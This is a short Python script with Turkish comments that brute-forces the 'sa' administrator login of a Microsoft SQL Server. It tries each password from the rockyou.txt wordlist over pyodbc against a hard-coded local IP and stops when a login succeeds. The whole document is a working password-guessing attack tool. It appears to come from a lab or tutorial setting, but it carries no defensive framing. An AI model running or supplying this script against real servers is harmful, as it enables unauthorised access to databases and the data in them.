import pyodbc

IP="192.168.43.16"  # SQL Sunucunun kurulu olduğu bilgisayara ait IP adresi
wordlist=open('rockyou.txt','r') #rockyou wordlisti içerisinde bulunan tüm keywordleri  wordlist isimli liste içerisine aktarıyoruz
for sifre in  wordlist: #wordlist içindeki kelimeleri tek tek denemek için döngü kuruyoruz
    try:
        password=sifre[:len(sifre)-1] #
        connection = pyodbc.connect('DRIVER={SQL Server};SERVER='+IP+';DATABASE=MASTER;UID=sa;PWD='+str(password)+'')#SQL Server'a wordlistte bulunan keywordler ile şifre denemesi yapıyoruz
        print("Giriş Başarılı Parola= "+password) #şifre denemesi başarılı ise kodlama da bi hata olmayacak ve try bloğu calısarak basarılı mesajı verdikten sonra döngüyü sonlandıracak
        break
    except:
        print(str(password)+" Parola yanlış") # connection başarılı değilse parolanın yanlıs oldugu ile ilgili mesajı dönüp diğer keyword'leri denemeye devam edecek.
